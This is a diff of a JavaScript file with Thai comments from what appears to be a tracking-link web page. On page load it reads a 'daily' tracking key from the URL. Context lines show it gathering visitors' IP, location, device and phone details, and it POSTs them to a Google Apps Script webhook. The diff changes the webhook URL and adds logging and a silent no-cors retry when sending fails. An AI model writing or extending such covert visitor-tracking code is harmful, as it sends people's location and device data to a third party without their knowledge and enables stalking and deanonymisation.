@@ -24,6 +24,19 @@ function getUrlParameters() {
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
 (function() {
+  console.log("Script.js เริ่มทำงาน...");
+  
+  // ตรวจสอบว่ามี tracking key หรือไม่อีกครั้งในไฟล์นี้
+  const urlParams = new URLSearchParams(window.location.search);
+  const trackingKey = urlParams.get('daily') || "ไม่มีค่า";
+  
+  if (!trackingKey || trackingKey === "ไม่มีค่า") {
+    console.error("Error: ไม่พบ tracking key ที่ถูกต้องใน script.js");
+    return; // ออกจากการทำงานหากไม่มี tracking key
+  }
+  
+  console.log("พบ tracking key ใน script.js: " + trackingKey);
+
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -863,11 +876,24 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzkWbVTjGCNfq7aGjaRXx4r_u5GV-eI2J1f07V_2G0rCWMiLakp61gAC7OCPPv55GGx/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
 
-  // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
+  // สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
     dataToSend.requestId = generateUniqueId();
+  }
+  
+  // เพิ่ม timestamp ปัจจุบัน เพื่อให้แน่ใจว่ามีข้อมูลเวลาเสมอ
+  if (!dataToSend.timestamp) {
+    dataToSend.timestamp = new Date().toLocaleString('th-TH', {
+      timeZone: 'Asia/Bangkok',
+      year: 'numeric',
+      month: '2-digit',
+      day: '2-digit',
+      hour: '2-digit',
+      minute: '2-digit',
+      second: '2-digit'
+    });
   }
   
   // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
@@ -878,6 +904,7 @@ function sendToLineNotify(dataToSend) {
   }
   
   console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
+  console.log("ข้อมูลที่ส่ง:", JSON.stringify(dataToSend).substring(0, 200) + "...");
 
   // ส่งข้อมูล
   fetch(webhookUrl, {
@@ -894,9 +921,24 @@ function sendToLineNotify(dataToSend) {
     // บันทึก requestId ที่ส่งสำเร็จแล้ว
     sentRequests.push(dataToSend.requestId);
     sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
+
+    // แสดงข้อความยืนยันในคอนโซล
+    console.log("✅ บันทึกข้อมูลเรียบร้อย - Tracking Key: " + dataToSend.trackingKey);
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
+    // พยายามส่งอีกครั้งหลังจาก 3 วินาที
+    setTimeout(() => {
+      console.log("กำลังพยายามส่งข้อมูลอีกครั้ง...");
+      fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(dataToSend),
+        mode: 'no-cors'
+      }).catch(err => console.error("พยายามส่งข้อมูลอีกครั้งล้มเหลว:", err));
+    }, 3000);
   });
 }
 
